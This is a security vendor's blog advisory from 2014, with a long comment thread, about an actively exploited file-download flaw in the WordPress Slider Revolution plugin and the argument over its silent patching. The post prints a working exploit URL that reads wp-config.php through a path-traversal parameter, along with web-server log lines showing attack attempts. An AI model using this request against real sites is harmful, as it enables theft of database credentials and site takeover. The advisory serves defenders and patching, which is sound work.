# Slider Revolution Plugin Critical Vulnerability Being Exploited

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* September 3, 2014

***12.17.2014:** See more information on the SoakSoak massive malware outbreak resulting from this vulnerability: [RevSlider Vulnerability Leads To Massive WordPress SoakSoak Compromise](https://blog.sucuri.net/2014/12/revslider-vulnerability-leads-to-massive-wordpress-soaksoak-compromise.html "RevSlider Vulnerability Leads To Massive WordPress SoakSoak Compromise") by Daniel Cid*

If you need help cleaning a hacked WordPress website, we released a new guide in 2016 that may help:

[Guide to Clean Hacked WordPress](https://sucuri.net/guides/how-to-clean-hacked-wordpress)

---

[Mika Epstein, Ipstenu, of Dreamhost,](https://twitter.com/Ipstenu) notified us today of a serious vulnerability in the WordPress Slider Revolution Premium plugin which was patched silently.

It turns out that the vulnerability was **disclosed via some underground forums.** ThemePunch confirms that their plugin was patched in version 4.2 for those that purchase the plugin directly from them, and they include an auto-updater which would address the problem. The real issue lies in the way the plugin is wrapped into theme packages. ThemePunch’s approach to disclosing the issue was based on guidance they received.

This a very popular plugin, and appears to be one of the most downloaded slider plugins from [Envato’s Marketplace – Code Canyon](http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380). It also appears to be bundled in theme packages so be sure to check your theme / plugins.

This is an example of where things go terribly wrong.

In this situation, a **very popular plugin developer** decided it was best not to disclose to anyone, in return patching silently. Mind you, this vulnerability was already disclosed as a zero day via underground forums, which you would have thought would incentivize a developer to work quickly and disclose even faster. No, instead a different course of action was taken.

Now, the vulnerability is being actively exploited in the wild. Yes, the vulnerability is severe enough that the attackers are able to compromise websites through it.

## WordPress Slider Revolution Vulnerability

About 2 months ago someone publicly disclosed a serious vulnerability in the Slider Revolution Premium WordPress Plugin that allows a remote attacker to download any file from the server.

The proof of concept shared via underground sites shows how someone can easily download the **wp-config.php**:

```
http://victim.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php

```

This is used to steal the database credentials, which then allows you to compromise the website via the database.

This type of vulnerability is known as a **Local File Inclusion (LFI)** attack. The attacker is able to access, review, download a local file on the server. This, in case you’re wondering is a very serious vulnerability that should have been addressed immediately.

> Local File Inclusion (also known as LFI) is the process of including files on a server through the web browser.

**UPDATE IMMEDIATELY!!!**

## Attacks In The Wild

We thought it’d be in our interest to see how active attacks against this vulnerability were. We turned to our [WAF](http://cloudproxy.sucuri.net) logs and found that this vulnerability is being actively attacked in the wild. Today alone, there were 64 different IP addresses trying to trigger this vulnerability on more than 1,000 different websites within our environment.

Here is a snippet of what to look for in your access logs:

```
194.29.185.106 - - [02/Sep/2014...] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 403 1082
85.103.12.6 - - [02/Sep/2014...] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 403 226

77.247.181.165 - - [02/Sep/2014...] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 403 1
37.148.163.38 - - [02/Sep/2014:...] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 403 7269
37.130.227.133 - - [02/Sep/2014...] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 403 11

```

It appears that via our environment, the attack appears to begin on August 09th, growing significantly on Aug 19:

[![I3JwzP4](https://blog.sucuri.net/wp-content/uploads/2014/09/I3JwzP4-600x185.png)](https://blog.sucuri.net/wp-content/uploads/2014/09/I3JwzP4.png)

Yes, if you are a client of our Website Firewall you are already being protected via our virtual hardening and patching mechanisms. No, if you leverage the latest WordPress Security utility plugin you are likely not being protected.

## **Update Now!**

If you use the WordPress Slider Revolution Premium plugin, you have to update it immediately! We also wish the developers were more open and had publicized the issue and alerted their customers of the problem beforehand. This type of action is an example of what not to do, especially if you find out about the issue via a Zero Day disclosure.

**\*\*\*Update – 20140903 – Which Versions Affected\*\*\*\***

This is a Premium plugin, this means we don’t have insights into the way they structure or release their plugins. We are however reaching out to the development team to confirm the exact date of the patch. There is mention of a patch in February, but because we have no insights into the older version of the plugin it is hard to confirm if it’s related to this or something else.

To illustrate the problem, here is a comment from one of the users of the plugin:

> I have this plugin installed on a number of sites but none of the plugins are prompting me to update. In fact they’re all showing different version numbers: 2.03, 2.1.7, 2.3.91, 3.0.5, and 4.1.4 while the latest version on CodeCanyon is 4.5. Any idea why there is no option to update from within the WordPress dashboard? Thanks for bringing this to our attention!

If we hear back from the developers we will update accordingly.

The biggest challenge with this vulnerability is that it appears to be bundled in many theme packages. This means theme shops have paid for a developer license and are releasing the plugin with or making it optional to users. Users may or may not know they have the plugin installed because of this. We are also noticing that while most theme packages have updaters, they don’t update the plugins, only the themes which causes more confusion to the process.

**\*\*\*Update – 20140903 – Affected Themes\*\*\*\***

A more comprehensive list of themes packages **possibly** affected include:

```

```

Released on [Exploit-DB September 1st, 2014](http://www.exploit-db.com/exploits/34511/). The emphasis on **possibly** is because if you are running the latest version of the theme, you might be ok, you might also not be ok.

It all depends on how the theme packager bundles the plugins and handles the upgrades. That, we can’t and won’t speak to.

If you know of more theme package feel free to let us know and we’ll be happy to update the list to ensure everyone is made aware equally and without prejudice. The emphasis here is to update your plugin, we do not intend to focus on any theme shops, their practice for handling dev licenses or any variation of that.

**\*\*\*Update – 20140903 – ThemePunch Response\*\*\*\***

Here is the response from the developers of the plugin, found in the comment thread below:

> Hi,
>
> The problem was fixed 29 updates back in 4.2 in February. We were told not to make the exploit public by several security companies so that the instructions of how to hack the slider will not appear on the web.
>
> You should always keep the slider up to date like any other WordPress component but urgently need to do this when using Version 4.1.4 or below in order to fix the security issue. Please use the included autoupdate feature (we solve issues within hours and update nearly every two weeks if nothing special needs a faster frequency).
>
> We are sorry for you guys out there whose slider came bundled with a theme and the theme author did not update the slider. Since you cannot use the included autoupdate function please contact your theme author and inform him about his failure!
>
> Best regards, ThemePunch

Here is the changelog from February:

The real issue here appears to be with how theme packages incorporate and subsequently update plugins their themes depend on.

   Sucuri to the rescue yet again, thanks!

   This appears to have been patched in version 4.2: <http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380#item-description__version-4-2-skywood-25th-february-2014-including-security-fix>

   We thankfully only found one site of the ~250 we maintain that was affected and were able to apply a manual patch to the UniteImageViewRev::outputImage() function in revslider/inc\_php/framework/image\_view.class.php

   I’m not a security expert, but adding a simple check of the file extension there seems to be working for us.

   If this plugin is packaged with a theme and unable to update immediately, will disabling the plugin prevent this until an update for the theme is released?

      @rickbannerman:disqus yes, disabling the plugin will prevent the attack – but no telling how doing so will affect the output of your site, depending on how the theme integrates.

      Yes seriously. Sucuri is getting out of hand writing an article showing how to do the exploit but not including information about what is the safe version number of the plugin or how to update it.

         Hi @virginiasolomon:disqus

         The exploit is already being actively shared, the faster we release it, the faster others can write rules to protect against it. This is not uncommon practice.

         Thanks

      The how to is pretty simple to pick out once you know where the vulnerability is… I would think exposing it like this will help show how big of a vuln it really is.

      In this scenario it makes sense to release, it’s already been in the wild, and actively being targeted, for over 30 days. At this point it’s time to share.

         I did not know that. it was out for that long I retract what I said it shows just how bad the Slider Revolution had been Vulnerable for so long as somebody hosted on FireHost and very naively believed

         I was secure Because of the very expensive FireHost firewall which proves the cost of the firewall does not always correlate with the ability for to secure a site.

         Until I ran the I used the hack (that is out on the web everywhere else already anyway.)
          I agree with Tony it is something that drove me to take action and hopefully will get others to wise up and use a top-of-the-line WAF like CloudProxy

         My hats off to for finding and patching before anyone else.

         Plus without this confirmation person are less likely to take a vulnerability is seriously

         If someone simply reads there has been a compromise on your plug-in will they take action?
          My thoughts are some well most will not.

         If you show them how to prove this is something that you need to take action on will they take action?
          Most will if they are smart.

         Adding another WAF thanks Tony much appreciated and I retract my comment above.

         All the best,
          Thomas

   This is worse than the article is making it out to be. This plugin costs money and there are TONS of themes on Themeforest that use this plugin giving buyers no way of updating the plugin without paying again. Themeforest does nothing about the quality of developers offering themes (their diligence about updating their themes) so many are stuck with this issue or will have to completely remove the slider from their sites. I’m having to remove the slider from 5 sites because of themes from Themeforest who’s developers don’t update their themes while using 3rd party plugins that are paid. Also, what is the version number of the plugin that isn’t vulnerable? What should people update the plugin to? This is kind of critical information that shouldn’t have been left out of this article.

      That’s the same boat I’m in. Either remove it and leave large holes where the slider would be, pay to upgrade or wait for the theme developer. Unfortunately it will be easier for a lot of people to upgrade then remove, so ironically, they will probably see an increase in sales due to this vulnerability.

         True but it shouldn’t be. I’m removing all of the sliders from all of my websites. Research shows they aren’t good for websites anyway, especially shops. I’ve been using them in static mode but now with all the easy frontend builder tools, I think I can do a bit better with adding a static image where the slider will be. This was just the final straw.

         Try leveraging a Website Firewall if you don’t want to upgrade or leave a gapping whole. Food for thought.

      Hi @virginiasolomon:disqus

      It’s actually a very bad situation, we agree.

      We can’t talk to the practice of updating within the ThemeForest ecosystem, not much we can do in that regard. I do feel for your situation though.

      Because this is a private plugin, we are limited in researching the history on it. What we have been able to see is that it has been patched in 4.5. This is why we don’t disclose versions, because unlike plugins in the WP repo, we can’t go backwards without engaging them (which we have not done).

      I would say upgrade to 4.5 to patch the issue.

      If the real issue is with handling the vulnerabilities, consider using a Website Firewall. Doesn’t have to be ours, there are others in the market, but they are designed to address this very issue.

      All the best

      Tony

         @perezbox:disqus We have a site with version 4.2.2 installed that does not seem to be affected by this vulnerability. I can provide you a copy of 4.2.2. to you privately if needed. The change log on the plugin site includes a vague “Fixed Security Issue” in version 4.2.

      While I cannot speak for other themes, we can certainly speak for Avada. We update it frequently, and any of our users can get a plugin update the day it comes out. This issue was fixed in the plugin back in February, and was updated in our theme shortly after. We would never do that to our user base. Please remember, the theme author does not make the plugin, they simply buy a license to include the plugin with the package, and most likely that is a part of the reason you have bought the theme in the first place. If what you say is true about other authors who themes you have bought, you should be contacting them immediately and also Envato support.

         How can we tell if our plugin is the most up-to-date? Do you have a version number? I always update plugins when notified… but would like to know for sure I’m covered.

            You can view the version number of any plugin in your plugin section of your admin. Look for the rev slider there. As long as you are on 4.2 or higher of the revolution slider, you are good. If using Avada theme, it was updated back in February so as long as you have updated your theme since then you are fine. If using Avada 3.5 or higher, then setup the auto updater so you will get notified of theme updates, which always include plugin updates also.

            View our Avada theme docs for how to update before the auto updater, and then how to setup the auto updater: <http://theme-fusion.com/avada-doc/install-update/how-to-update-theme/>

            The article says that the issue was fixed in version 4.2. The version number appears on the main Revolution Slider in the WP backend. Just scroll down a little bit.

         Yes, but when I updated the slider, it didn’t work anymore. The server was failling to load js files. Now I’m stuck with either no slider or an infected slider. Perhaps their are special instructions for making this update work?

      Not only Themeforest does nothing about quality, also Codecanyon. I bought a lot of plugins that did not work properly, even on a brand new WordPress installation. And that was the reason to ask myself: how secure are those plugins from Codecanyon? And those items from Themeforest? The bad truth about Envato is: they look for quantity, not for quality. My hope is that someone builds an alternative where items are previewed for code quality and functionality. That would be a lot of work so items would be more expensive. And maybe you couldn’t find as much items there as on Envato’s marketplace. But I’m shure that people would pay more when they know that not every second item they buy is pure bullshit.

      hi, Stefan from ThemeFuzz here,

      We have a system in place for clients to easily update the bundled plugins. Even if you do not purchase the specific plugin, by using our themes you are notified and have the ability to update the plugins to their latest version.

      This ensures that none of our clients are affected by this vulnerability.

      Best regards,
       Stefan

      The attack exploits the revslider\_show\_image function by calling files it shouldn’t be calling. I’d imagine the vulnerability would persist outside WP.

         This is incorrect, the issue is specific to WP (and a very old version of the plugin) — the revslider\_show\_image function you are referring to is a PHP function.

      Alex,
       all of our customers website are running on 4.6 (which is the 26th Aug 2014 release) and I have retested all sites and none exhibit the vulnerability. So looking good for the newest version.

   If we’re using managed wp hosting with Flywheel and running an older version of the plugin, is the site ok (since Flywheel doesn’t give write access to wp-config)? I reached out to them for an answer but figured I’d go ahead and ask here.

   Also, does disabling the slider plugin remove the vulnerability or do I need to completely delete it?

      @caseyfulgenzi:disqus blocking write access to wp-config.php will not provide any protection from this attack, but disabling the plugin does.

      getflywheel is an awesome managed WordPress site but I can tell you every one of the big five are vulnerable right now I have tried it on all of them.

      It is best to disable the plug-in or what I would suggest is changing it out with a better slider
       Soliloquy is much faster and works better with managed WordPress hosting

         Just tried disabling the plugin. WP refreshes and gives the notification at the top that it’s disabled but then it’s actually not. Is that just because it was included with the theme?

            It’s possible the theme is automatically activating the plugin. If so, you may have to remove the plugin.

       Mmm, I don’t know the specifics of the plug in… However you could try something like this (assuming a
        \*nix environment)
        find . -exec grep -l “revslider\_show\_image” {} ;
        which would throw back a list of files containing the function the plugin calls for in admin-ajax.php.

          Thanks Ryoku! I was able to find one installation by doing
           find /var/www/vhosts/ -name “revslider” -print
           However I’m not sure this method will work across the board because that plugin has been packaged with so many themes, I figure directory name could have been changed over time.

          The problem I found is that “revslider\_show\_image” is present in both the vulnerable and updated (fixed) versions. My solution was to do something like this:

          locate revslider.php

          Then for each result I did:

          head /path/to/revslider/revslider.php

          Revslider versions <=4.1.4 are vulnerable (per <http://packetstormsecurity.com/files/127645/WordPress-Slider-Revolution-Responsive-4.1.4-File-Download.html>)

          For each plugin that's vulnerable, first make a backup:

          tar -zcvf /backup/sitename\_date.tar.gz /path/to/revslider/

          If you have any custom CSS for titles / text layers, it's a good idea to make a separate backup of that. I've found it stored in revslider/rs-plugin/css/captions.css and revslider/rs-plugin/css/dynamic-captions.css

          Then update the plugin to any version greater than 4.1.4

          Once you update the plugin, you'll have to re-add your custom CSS by editing any slide and then modifying global styles.

          I am working on determining the specific code that fixed this vulnerability. Right now I've found a few lines in revslider/inc\_php/framework/functions\_wordpress.class.php that appear to be relevant:
           —–
           Extra lines in New before 187 in Old (File functions\_wordpress.class.php; Line 189:192; File functions\_wordpress.class.php; Line 187)
           —–

          $ul\_dir = wp\_upload\_dir();

    I have this plugin installed on a number of sites but none of the plugins are prompting me to update. In fact they’re all showing different version numbers: 2.03, 2.1.7, 2.3.91, 3.0.5, and 4.1.4 while the latest version on CodeCanyon is 4.5.

    Thank you for letting us know about the explot. However, please remove Avada from the article as there is no reason to put us in the spotlight. We regularly update our theme and bundled plugins <http://theme-fusion.com/avada-documentation/changelog.txt>

    However, this is terrible from revolution slider to not let their users know about the major patch. I have not even received an update email.

    According to the changelog (and a comment here), this issue was fixed in Revolution Slider 4.2 which was released in February on CodeCanyon.

       We have not been able to confirm this. We are reaching out to the development team. We have no idea what was patched in 4.2 and what was not, we have no access to the plugin. Until we see the code it’ll be hard to confirm.

          You can see the changelog from their item page, 4.2 is 7 months old and they did list our the security issue: <http://d.pr/i/MyHU> However, we do not know the details of that change either, only that it was listed out as the “security issue”. I’m sure Themepunch can shed some light on that.

          We fully agree that a security issue is serious and should be taken care of (as Themepunch already did), however you should be careful with how you word the article when you are not sure of what happened or when it was fixed. You mention that they didnt even notify their buyers when that can easily be proved to be false as the changelog shows above. Why post that without knowing the truth?

          Once you have all the facts then you can post an article bashing them saying they did not notify anyone, however you do not know that and simply assumed that was the case. As you stated, you do not even have the plugin. I would think for a serious matter such as this, Sucuri would of spent the $18 to buy a copy of it and investigate. Just my .02 on the matter.

          Nevertheless, I’m sure Themepunch will be in touch if you guys reached out.

          Thanks

             Hi @lukeabeck:disqus

             Thank you for your thoughtful response.

             Updating the change log is not notifying your buyers, it’s updating your change log. As you can also see from that log entry, there is no way to know if that fix is relevant to this issue or something else (unless you know something I don’t, but based on your response above you don’t).

             Regardless, if the only issue here is “notification” we can live with that. Because of the magnitude of the issue, and the fact that it was brought to our attention from a third-party whom had been having issues engaging with the developer, we stand by our approach.

             Thanks for your .02 though. Look forward to engaging with them.

             All the best

             Tony

                You’re most welcome.

                And don’t get me wrong, we fully agree with you on the importance of the security issue. That is not what I was trying to get across. And I understand about the changelog also. the point I was making is the article made accusations about the issue, when in reality it sounds like it cannot be backed up. Research upfront would of been better. How do you know that buyers were not notified if you have never bought the plugin? That is the point I was making.

                Either way, best of luck.

                Thanks

                So how should plugin developers notify the buyers, in your opinion?

                Envato does not allow plugin developers to directly contact buyers, unless the buyer first posts a comment. The buyer needs to initiate contact first, authors cannot simply send out a mass e-mail saying “Hey everyone, there is a bug, please patch it up immediately.” Authors do not have access to buyers’ e-mail accounts, or any personal information for that matter.

                With that said, updating the changelog is all any plugin developer really can do. There is no line for direct communication with every single person who has ever purchased the plugin, this simply does not exist within Envato’s infrastructure.

                Doesn’t this only really show what a big cock-up Envato is and their practices are? Why would a developer even want to be on that platform? Why does Envato allow theme-authors to bundle plugins?

                I purchased the plugin so that I would receive updates and support about it. How hard would it have been to add some explanation/info/urgency to the messages that are currently sent to owners (through Envato)?

                This would not have helped those users who are bundled, but at least it would get the word out. And I could have patched the error right away when notified. Shame on you, ThemePunch for hiding a problem and not doing everything you can spread the word about the severity to at least your paying customers.

    First off, we are not the developers of the revolution slider, we make the Avada theme. And the plugin is not “integrated” into the theme, is is simply a stand alone plugin that you can choose to install if you wish. Pointing out our theme name in this article is completely unfair for several reasons, all of them obvious. Also, the version you are talking about was fixed back in February, 7 months ago.

    And from what I see, the slider developers did post it in their changelog, which is contrary to your above report. It lists out a security fix in the changelog. However, they certainly should of been more proactive in letting their user base know about this, we fully agree with you on that. Either way, its unfair to list out one theme when dozens of them use that plugin, please remove our theme name from your article.

       Hi @lukeabeck:disqus

       We removed reference to the Avada theme. We’ll be looking to see if we can’t compile a more thorough list of theme packages that make it available to their clients in an effort to make it a more comprehensive list and in an effort not to single out any one shop.

       The reference to your package was just one we tested, it wasn’t saying you were responsible for it, it was saying that end-users might have it installed whether they intentionally did it or not, in short, look through your stuff and get it patched.

       1. ![](https://secure.gravatar.com/avatar/e31e628193e09121b9036859cccd501e?s=60&d=mm&r=g) **lukeabeck** says: [September 3, 2014 at 5:36 pm](https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html#comment-3955)

          Thanks for removing it. Yes we know what is was saying, however it casts a bad light no matter how you say it.

          And it was fixed back in February, 7 months ago and updated in our theme during that time as our included plugins always are. We’re very cautious about any bugs or issues we find in anything dealing with our theme.

          Thanks again.

             We’ve updated the list of possibly affected themes to more accurately reflect the impact and added some qualifiers to help differentiate intent.

             You might also be curious to know that when you run an old version of your theme and update, the old version of the plugin stays in place and no mention is made of it being out of date. This has been tested in our environment (version 3.2). If we delete the old version, then your upload package notifies us to upload the latest version.

             Thanks

                Yes that is because v3.2 is older and does not include the update messages. As long as you are on v3.5 or higher, you will be notified when you update the theme to update the plugin.

                Why has your list not been updated with other themes? Seems my comment was deleted also that listed them out. Your “comprehensive” list is not “comprehensive”. Since your whole vendetta is to warn people and get the word out, why have you not updated your list and only show a very small fraction of themes?

       Luke, I’m a user of Avada theme and I’m a happy user. However, the following is not true:

       “First off, we are not the developers of the revolution slider, we make the Avada theme. And the plugin is not “integrated” into the theme, it is simply a stand alone plugin that you can choose to install if you wish.”

       Revolution Slider ‘was’ integrated to Avada when I bought it. There was no way to delete or update it indipendently as it was not listed on the WP Plugins page. Only after a few versions later you have seperated the plugin from the theme.

       I’m glad to see that you have stopped integrating plugins that you license. It was a bad practice. You should have thought that in future updating code would have become a mess, which it did with very bad consquences to many of your users who were hacked.

       I want to put the record straight.

       1. ![](https://secure.gravatar.com/avatar/e31e628193e09121b9036859cccd501e?s=60&d=mm&r=g) **Luke Beck** says: [March 24, 2015 at 5:09 pm](https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html#comment-4089)

          I’m afraid there is a misunderstanding here, the record is not “un-straight” 🙂

          First off, the rev slider ‘was’ integrated long ago, yes. But no, we are not the creators of it nor do we have control over it. In addition, the exact day the plugin update was issued for the security issue, it was also live in Avada for any who updated and kept up with that.

          And I’m not sure what you mean by “future updating code would have become a mess”, that is definitely not what we have seen or experienced in our support. The change from integrated plugins to non-integrated was seamless.

          1. ![](https://secure.gravatar.com/avatar/e2542a0c8ff5ffd2cf8dc34de1d148dd?s=60&d=mm&r=g) **sarumbear** says: [March 24, 2015 at 9:05 pm](https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html#comment-4090)

             “First off, the rev slider ‘was’ integrated long ago, yes. But no, we are not the creators of it nor do we have control over it”

             This is like saying the vulnerabilty in TimThumb was nothing to do with theme authors. If you ‘include’ a code in your intalltion routine, what happens with that code IS your responsibility. Do realise that I’m not saying you reacted irresponsibly. You acted correctly. However, your (unnecessary) defense is not correct.

             “that is definitely not what we have seen or experienced in our support.”

             I have recently updated a very early version of Avada and the process was far from “smooth”. Far too many things have changed in the theme. Even the shortcodes which were integrated are now supplied via a plugin. The vulnerable Revolution Slider has also changed, which required copying CSS values over.

             Furthermore, there was no theme update notification (or an option to do so). As I was not following your releveant forum I was only notified by Envato that there is a new version due to the said vulnerability.

             Do you think that my experience can be classified as “smooth”?

             1. ![](https://secure.gravatar.com/avatar/e31e628193e09121b9036859cccd501e?s=60&d=mm&r=g) **Luke Beck** says: [March 24, 2015 at 10:11 pm](https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html#comment-4091)

                Hey Sarumbear … let me say thank you for being a long time Avada user! I can recall your username long ago, maybe even back to v1. That’s pretty awesome 🙂

                I think we will only disagree further on the first point. It is not a defense as much as it is an understanding. I heartily disagree with you on that point that we control the rev slider code and should be the ones who make changes. It is the highest selling WP slider plugin, hugely popular. We include a license for it in our theme, we will not make edits to the plugin nor manage the codebase. I’m pretty sure you will find that same response from other theme authors.

                For updating, this will depend on many factors, none of which deal with plugin integration which is what your first comment presented and why I replied as I did.

                Yes, shortcodes are now supplied in a plugin, and that is a good thing. It is best practice and how it should be done. When you update the theme, you simply install the plugin to get the shortcodes. You are notified in your WP admin that the plugin needs installed … that is all standard. In addition, we always list out these changes in our documentation and update notes. Always check out the supplied changelog when you update, or visiting our support center.

                Copying over CSS from rev slider is also something that you should always be doing. If you are using custom CSS in anything, you should be backing it up. We do not control changes made in the rev slider, and backing up CSS is something you should always be doing no matter the situation.

                For theme updates, there is not an automatic theme updater supplied for themes from Themeforest. Originally Avada never had one, but we added it back in v3.5. When you set it up, you get auto theme updates and will be notified in your admin. In addition, you can be notified via Themeforest any time the theme is update, all it takes is checking a box on the downloads page. I wish that was done automatically from their side but it is not.

                About the rev slider security issue, once we found out we did everything we could to notify our user base. I checked your user account and you are not subscribed to our newsletter so you only received an email from Envato once they found out, which was exactly the same time we found out. Outside of that, I’m not sure how else we could of notified you, especially since TF notified anyone who bought the plugin or a theme that supplied it.

                I wish that all plugins came with auto updates no matter what, just like ones from the WP repo. But plugins sold on code canyon are not like that and have specific licensing rules to them. Again, that is not something we control, but we have done what we can by adding auto theme update notifications and are recommending every chance we get to make sure any plugin included as a bundle on TF comes with the same auto updates that come with a plugin bought individual. I think it is coming this year, i can feel it 🙂

                You mentioned that new updates had “far too many things that change”. Yes, and that is a good thing. Any product, especially software does that over the course of time. It is called improvement and we go through great lengths to make these improvements and ensure they have extremely little impact on previous customer sites. These new items we add and changes made are at the request of our 120K user base and are all done in the spirit of improvement. If you are happy with the site, then do not update. If you do update, take a little bit of time and look up our notes, they are always available. If a security issue comes up, like the one we are discussing, then yes you should update no matter what and take time to look up update notes.

                When you update any software, always keep things like that in mind. New software comes with new features, new settings, new processes. To learn about them, always check with the developer. We always put out update notes with each release.

                For any other update issues and your process not going” smooth”, we would gladly reply to any questions or concerns you have via our support system.

                Thanks

                Just to let you know:

                “You are notified in your WP admin that the plugin needs installed … that is all standard.” hasn’t happen, neither for the shortcode plugin nor for Revolution Slider. I knew of the latter hence I have installed it but not the former, which I knew of its existance after my first support email.

                Besides that where we disagree is not specific about you as a publisher. I am debating the fallacy of a general practice. The v1 Avada had bundled the Revolution Slider in a such a way that it was not controllable by the user. It was installed within the theme directory by you and the user had no knowledge of it being a seperate entity. This is afact. In situations like this the existence of such a code is your responsibilty. That is my stance and that is the stance that is accepted in the software world, maybe not in the WP world. However following the recent developments I can see that WP world is maturing and following the established software practices: if a code is not under your control tell the user from the start, make sure they read that code’s license and T&Cs seperately, etc., etc.

                I wish you all the best as an otherwise happy user. Yes, I am a user since Avada 1.0. Since then I am responsible for at least a dosen more licenses purchased by clients to whom I consult to.

                If you are on Avada 3.5 or higher and have setup the auto theme updater, then you will be notified. If you have not set it up, then you will not be.

                My point though is that there is still not a method for themes that includes premium plugins to auto update those premium plugins, the license does not allow that. We have to follow those rules, we cannot break license. However …

                Avada is auto updated once you set it up, simply fill in your credentials in theme options and auto updater will work. When we issue an update, you will be notified in your WP admin just like any other default WP theme. Then when you update the theme, you also get notifications to update the plugins. See my link above. Again, this is all we the theme author can do until license rules change and we are allowed to have our customers auto update premium plugins we include.

                Regardless of that fact, you are safe if you use our auto updater because we will always issue a theme update the same day any security issue is known. As long as you have theme auto updates setup, you will be notified that same day in your admin.

                Trust me when I say that we want each premium plugin to have auto updates with it on their own. It would make everyone’s life easier if plugins that are included with a theme, came with their own single license to auto update. Right now, following the license rules, we cannot do that and can only do it through the theme, which we do religiously.

                Envato does inform users of these things on their site, but you have to go digging. Keep in mind that we sell exclusively on Envato’s marketplace, they make and control the rules and licenses. We abide by them.

                Thanks for the continued purchases and support! We’re just a ticket away from any questions or concerns you have.

                Thanks

       Incorrect, still susceptible. Whether ./wp-config or ../../wp-config doesn’t matter… same applies. That file was also just an example.. it could have been any other file as well.

       Careful if you have multiple domains on the same hosting account and/or additional domains are mapped to subfolders. If you do this for one of those additional domains, the move of wp-config.php to level up will result on site on root folder become unusable/corrupted

    I have in the past encountered many website owners who engaged developers to create their site and ended up with plugins like Revolution Slider and simply don’t have access to the upgraded version. They will be stuck and will have to spend money to purchase a license under the name.

    Hi,

    The problem was fixed 29 updates back in 4.2 in February. We were told not to make the exploit public by several security companies so that the instructions of how to hack the slider will not appear on the web.

    You should always keep the slider up to date like any other WordPress component but urgently need to do this when using Version 4.1.4 or below in order to fix the security issue. Please use the included autoupdate feature (we solve issues within hours and update nearly every two weeks if nothing special needs a faster frequency).

    We are sorry for you guys out there whose slider came bundled with a theme and the theme author did not update the slider. Since you cannot use the included autoupdate function please contact your theme author and inform him about his failure!

    Best regards, ThemePunch

       I had Revolution Slider installed, but the auto-update feature did not work. The auto-update area inside the plugin interface will not accept any entries: envato username, envato api key, plugin purchase code. Rev Slider has lots of great functionality, but it has historically been very slow. Due to the sluggishness I don’t use the plugin anymore, so I simply deleted it. That should fix the security problem.

          Hi TommyLinsley,

          the auto updates works fine, however you will need to have a regular license purchased of the Plugin. It will not work with your “Theme purchase code”.

          Since this Fix we had 29 !!! updates. And not just the Security Issue has been fixed since that, but around 250 new features has been added, and also the engine has been rewritten.

          The “historicaly slow” slider what you talk about from Ferbruary got 29 updates, and has better speed and load messures as the most known slider today.

          We have a full customer service, available almost 7×24. You have always the possibility to contact us if you have issues with performance and or updates. We will help for sure !

          Cheers,

          ThemePunch

             @themepunch:disqus don’t you agree that it is a bit silly to first sell your dev license to countless of theme developers, so they can bundle your plugin with their themes and now make the end user responsible for purchasing the plugin?

             You could have seen that coming from a mile away!

             I really think it is also your responsibility to actively approach the theme developers that bought your plugin AND all the possible end users.

             Also silently updating a plugin that has such a major vulnerability is just so bad practice. You mentioned before that several security firms advised you against disclosing that information. Names Please!

                Hi,

                DevLicense – Theme Authors are informed about updates from Envato like every other customer. The hint “Security Fix” should ring some bells in their heads too.

                What does “Security Fix” means other than Security fix? Why did they not update the plugin since February? Our direct customers do and can update their plugin regularly.

                Sliders that came bundled with a theme are by the terms of CodeCanyon responsibility of the theme author. If they cannot provide such support they should not include the slider! We cannot check every theme in the internet (if you provide this service please contact us). If the theme authors would have done their job end customers would not have to shell out $18 to get a future proof plugin. If you find your theme has not updated plugins inside please contact the support of the theme author or the market place about this. It is a farce to be blamed for someone else’s failures too.

                Silent Update – We gave everybody the time to update their plugin BEFORE the details of the hack becomes public. You had 29 Updates and 7 months. Why did you or the theme author not update when you were informed of a “Security Fix”? “Silent” means we did not give out detailed information in order to protect your installation. Do you wanted us to expose all installations with details of “HowTo Hack” without giving anyone the chance to update?

                Security firms – You want to keep on the finger pointing? Keep pointing to us then. We made the decision to trust our partners, so do they.

                Cheers, ThemePunch

                You sold buggy code to theme developers but do not allow direct update to clean it. That is at best mean, at worst irresponsible. Take your pick.

                Meanwhile, you also allowed theme developers integrate the plugin in such a non-standard way that even if I am willing to re-purchase your plugin to access the clean code, I’m stuck with the old code. At best irresponsible, at worst…you name it!

    Hey guys, I made a quick video showing that moving your wp-config.php doesn’t stop this vulnerability from being exploited. You’ll need to update or protect with a firewall to prevent it from happening. Take a look here: <https://www.youtube.com/watch?v=etkFLR_RoO0>

          If your database server is configured to only allow local connections it would probably be quite difficult for them to connect to the database (but probably not impossible?).

    Wow. This is quite parallel to what’s been going on with GM’s faulty cars. They sell them through dealerships and the dealers can decide whatever they want to do with the cars (price, financing, rebates). But when there is an issue with the cars, GM releases a statement to EVERYONE (gov’t, general public, dealerships), and any consumers using that car brings the vehicle back to the dealership which then decides how it will go about remedying the issue.

    Initially, I thought the plugin developer was being unjustly maligned “We have no control over theme developers who bundle our slider with their files.” but they should have contacted everyone they licensed the plugin to and said “Hey, please only include this version of the slider, or please stop including the slider, or please let your customers know about the issue and contact us.”

    Not sure who decided that silence was golden here, but this should be a lesson to developers. Tons of companies issue product recalls (and it doesn’t damage their reputation). Web companies should not think that they are somehow above the practices of brick-and-mortar companies.

       No. See @joeherbrandson:disqus’s earlier comment; he’s created a video demonstrating that moving the wp-config.php file up one folder does not protect it from this vulnerability.

       Also, this vulnerability is not limited to the wp-config.php file – it was just used as an example to demonstrate the vulnerability.

